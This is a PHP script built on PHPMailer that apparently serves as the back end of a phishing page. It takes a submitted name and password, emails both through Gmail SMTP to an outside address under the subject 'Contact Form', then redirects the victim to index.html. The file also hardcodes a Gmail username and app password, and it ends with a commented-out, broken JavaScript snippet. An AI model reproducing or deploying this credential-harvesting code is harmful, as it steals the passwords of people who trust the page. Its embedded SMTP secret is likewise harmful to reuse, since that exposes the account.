<?php

//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if (isset($_POST['submit'])) {
    $name = $_POST["name"];
    $pass = $_POST["pass"];
    
               
    //Load Composer's autoloader
    require 'PHPMailer/Exception.php';
    require 'PHPMailer/PHPMailer.php';
    require 'PHPMailer/SMTP.php';

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    try {
        //Server settings
        $mail->SMTPDebug = 0;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'carebusiness674@gmail.com';             //SMTP username
        $mail->Password   = 'pmcx cwgz noxh lkpj';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('carebusiness674@gmail.com', "$name");
        $mail->addAddress('virenkhokhar777@gmail.com', 'user');     //Add a recipient
        
		// info@alkhatalfodee.com
    
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Contact Form';
        $mail->Body    = "Sender Name - $name <br> Sender Password - $pass <br>";
    

        $mail->send();
        echo '<center><h2 style="color:green;">Message has been sent</h2></center>';
        header('Location:index.html');
    } catch (Exception $e) {
        echo "<center><h2 style='color:red;'>Message could not be sent. Mailer Error: {$mail->ErrorInfo}</h2></center>";
    }
}
?>

<!-- <script>
    let go = window.location.href = "index.html";
    function setTimeout(() => {
        
    }, 2000);
</script> -->